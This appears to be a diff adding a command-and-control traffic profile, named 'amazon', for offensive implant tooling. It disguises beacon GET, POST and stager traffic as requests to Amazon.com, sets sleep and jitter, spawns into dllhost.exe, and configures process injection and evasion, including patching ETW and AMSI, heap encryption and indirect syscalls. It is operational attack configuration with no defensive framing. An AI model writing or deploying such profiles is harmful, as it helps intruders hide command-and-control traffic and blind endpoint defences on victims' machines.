@@ -1,0 +1,90 @@
+name: amazon
+description: Amazon retail CDN traffic mimicry
+sleep_time: 45
+jitter: 35
+user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+
+http_get:
+  uri:
+    - /s/ref=nb_sb_noss
+    - /gp/product/ajax
+  verb: GET
+  headers:
+    Host: "www.amazon.com"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    Accept-Language: "en-US,en;q=0.5"
+  body:
+    parameter: session-token
+    base64: true
+  server_output:
+    prepend: "<!DOCTYPE html><html><head><title>Amazon.com</title></head><body>"
+    append: "</body></html>"
+    base64: true
+    headers:
+      Content-Type: "text/html; charset=UTF-8"
+      Server: "Server"
+      x-amz-id-1: "THKUYEZKCKPGY5T42PZT"
+
+http_post:
+  uri:
+    - /N4215/adj/amzn.us.sr.aps
+    - /gp/delivery/ajax
+    - /gp/aw/csm/analytics
+  verb: POST
+  headers:
+    Host: "www.amazon.com"
+    Content-Type: "text/xml"
+  body:
+    base64: true
+    mask: true
+  server_output:
+    base64: true
+    headers:
+      Content-Type: "text/html; charset=UTF-8"
+      Server: "Server"
+
+http_stager:
+  uri:
+    - /gp/product/
+    - /gp/video/detail
+  verb: GET
+
+spawn_to:
+  x86: "%windir%\\SysWOW64\\dllhost.exe"
+  x64: "%windir%\\System32\\dllhost.exe"
+
+process_inject:
+  alloc_type: VirtualAlloc
+  execute_type: CreateThread
+  use_syscalls: false
+
+evasion:
+  patch_etw: true
+  patch_amsi: true
+  unhook_on_load: false
+  heap_encrypt: true
+  syscall_method: indirect
+  sleep_technique: timer
+  anti_analysis: false
+
+mutation:
+  uri_suffixes:
+    - ""
+    - /1
+    - /2
+    - /ref=sr_1
+  path_tokens:
+    - ref
+    - qid
+    - sprefix
+  prepend_pool:
+    - '<?xml version="1.0"?><Request>'
+    - "<!--"
+  append_pool:
+    - "</Request>"
+    - "-->"
+  chrome_versions:
+    - "126.0.0.0"
+    - "127.0.0.0"
+    - "128.0.0.0"
+  mask_key_range: [32, 223]
